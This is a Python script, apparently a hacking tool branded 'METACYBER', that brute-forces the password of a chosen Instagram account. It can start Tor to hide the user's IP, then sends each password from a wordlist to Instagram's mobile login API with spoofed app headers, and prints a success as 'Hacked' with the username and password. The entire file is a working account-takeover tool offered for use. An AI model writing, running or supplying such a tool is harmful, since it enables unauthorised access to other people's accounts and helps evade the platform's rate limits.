from os import name , system
from time import sleep
from requests import post
from colorama import Fore
from uuid import uuid4
from platform import uname as Um

Banner = Fore.LIGHTGREEN_EX+'''
███╗   ███╗███████╗████████╗ █████╗  ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██╔████╔██║█████╗     ██║   ███████║██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
██║ ╚═╝ ██║███████╗   ██║   ██║  ██║╚██████╗   ██║   ██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝                          
'''


def Clear():
    sysNode = Um()[0]
    if sysNode == 'Linux':
        system('clear')
    elif sysNode == 'Windows':
        system('cls')
    print(Banner)
Clear()

def Tor():
    print(Fore.RED+'\n['+Fore.YELLOW+'1'+Fore.RED+']'+Fore.CYAN+' Tor Start\n')
    print(Fore.RED+'['+Fore.YELLOW+'2'+Fore.RED+']'+Fore.CYAN+' Not Change IP\n\n')
    selects = int(input(Fore.RED+'┌─['+Fore.GREEN+'Change'+Fore.YELLOW+'~'+Fore.LIGHTYELLOW_EX+'IP'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE))
    if selects == 1:
        system('sudo service tor start')
        print(Fore.RED+'\n['+Fore.LIGHTGREEN_EX+'!'+Fore.RED+']'+Fore.YELLOW+' Tor Started')
        sleep(0.89)
        Clear()
    elif selects == 2:
        pass
        Clear()
Tor()
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
white = Fore.WHITE
uid = str(uuid4())
log_head = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept': "*/*",'Cookie': 'missing','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US','X-IG-Capabilities': '3brTvw==','X-IG-Connection-Type': 'WIFI','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'i.instagram.com'}
link = 'https://i.instagram.com/api/v1/accounts/login/'
user = input(Fore.RED+'┌─['+Fore.GREEN+'Instagram'+Fore.YELLOW+'~'+Fore.LIGHTYELLOW_EX+'UserName'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE)
print('')
passlist = input(Fore.RED+'┌─['+Fore.GREEN+'Password'+Fore.YELLOW+'~'+Fore.LIGHTYELLOW_EX+'List'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE)
passlist = open(passlist).read().splitlines()
for pwd in passlist:
    try:
        log_data = {'uuid': uid,'password': pwd,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'}
        login = post(link,headers=log_head,data=log_data,allow_redirects=True)
        if 'logged_in_user' in login.text:
            print(Fore.RED+'\n['+Fore.GREEN+'+'+Fore.RED+']'+Fore.CYAN+' Password '+Fore.RED+'Hacked'+white+f' {user}:{pwd}')
            # Fore.RED+'['+Fore.GREEN+'+'+Fore.RED+']'+Fore.CYAN+' Password '+Fore.RED+'Hacked'+
            break
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in login.text:
            print(Fore.RED+'\n['+Fore.YELLOW+'-'+Fore.RED+']'+Fore.CYAN+' Password '+Fore.RED+'Not '+Fore.GREEN+'Hacked'+Fore.MAGENTA+f' {user}:{pwd}')
        elif 'Bad request' or 'Please wait a few minutes' or 'challenge_required' or 'two' in login.txt:
            print(blue+'[!]'+' You Have To Change Your IP Address !')
        else:
            pass
    except KeyboardInterrupt:
        print(red+'[!]'+white+' Program Stopped By User ...')
        exit()
    except:
        print(red+'[!]'+white+' An Error Occoured ! , Please Use Powerful Internet & Proxy ...')
        exit()